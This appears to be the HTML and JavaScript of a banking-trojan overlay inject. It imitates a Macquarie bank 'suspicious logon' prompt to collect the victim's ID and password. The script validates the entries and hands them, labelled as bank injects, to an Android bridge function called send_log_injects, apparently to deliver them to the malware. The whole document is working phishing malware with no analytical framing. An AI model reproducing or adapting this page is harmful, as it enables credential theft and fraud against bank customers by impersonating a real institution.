            <section>
                <p style="color: #fff;"> Suspicious logon detected. Fill in the required fields so we can verify your identity. </p>

                <input type="tel" class="input login" id="login" name="login" placeholder="Macquarie ID" maxlength="8" autocomplete="off">
                <input type="password" class="input password" id="password" name="password" placeholder="Password" autocomplete="off">
                <input type="submit" class="button" id="sendData" value="Log in">
                
                <p style="text-align: center;color: #fff;margin-top: 20px;">Trouble logging in?</p>
            </section>
            <footer>

            </footer>
        </div>
    </form>

    <script>
        var login = document.getElementById('login'),   
            password = document.getElementById('password');
    
        var sendData = document.getElementById('sendData');
        function CheckPassword(cb) { 
            var paswd = /^(?=.*[!@#$%^&*])[a-zA-Z!@#$%^&*]{8,15}$/;
            if(cb.match(paswd)) { 
                return true;
            } else { 
                return false;
            }
        }

        sendData.onclick = () => {
            if(login.value.length !== 8) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(CheckPassword(password.value)) {
                password.classList.remove('error');
            } else {
                password.classList.add('error');
            }

            if(login.value.length === 8 && CheckPassword(password.value)) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
